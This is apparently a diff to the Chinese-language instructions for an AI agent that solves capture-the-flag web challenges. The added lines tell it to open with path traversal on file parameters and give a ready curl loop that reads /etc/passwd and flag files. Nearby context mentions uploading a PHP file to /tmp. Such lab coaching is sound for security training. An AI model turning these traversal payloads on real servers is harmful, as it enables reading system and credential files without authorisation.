@@ -114,6 +114,18 @@ vi 等一整套）。所以你不需要「请求某个接口」，你**直接跑
   试过 SSRF、失败——那就换另一族（越权 id / 路径穿越 / 模板注入 / 反序列化），
   不要在同一族里改写同一条 payload（把 python 改写成 curl 不算换思路）。
   提示词里有「已排除」清单，同族在这个路径上失败过就不要再试。
+- **看到 `?id=` / `?file=` / `?path=` / `?page=` / `?doc=` / `?name=` / `?download=`
+  而且值是文件名或路径的接口，第一条命令就试路径穿越，不要先枚举别的路由。**
+  这类「按文件名下载/预览/导入」的接口在靶场里极大概率没做路径校验：
+  `for p in '../../../../etc/passwd' '../../../../challenge/flag.txt' '../../../../flag'
+  '/flag.txt' '../../../../root/flag.txt'; do echo -n "$p ";
+  curl -sS -b /tmp/cj -o /tmp/o -w '%{http_code} %{size_download}\n' --get
+  --data-urlencode "id=$p" "http://HOST/download.php"; grep -a 'root:x:\|flag{' /tmp/o; done`
+  实跑教训：a-05 就是 `/download.php?id=` 直读 `/challenge/flag.txt`，而模型拿到了这个
+  链接却把 20 步全花在枚举不存在的 admin/approve 接口上，最后 stale 放弃。
+- 登录成功后先**把仪表盘里所有 `href`/`action`/`.php` 链接原样抓出来**（
+  `grep -Eo '(href|action)="[^"]+"'`），带参数的接口是最优先的攻击面；再去枚举
+  字典里猜的路由——顺序反了就是白烧步数。
 - 同一个命令不要重复跑；连续两次没进展就换思路（换协议、换端口、换路径、换角度）。
 - **写文件用 `printf` 单行，不要用 heredoc。** `cat > /tmp/x.php <<'EOF'` 这种在
   JSON 里带换行很容易坏，坏掉的表现是后面 `curl -F file=@/tmp/x.php` 报
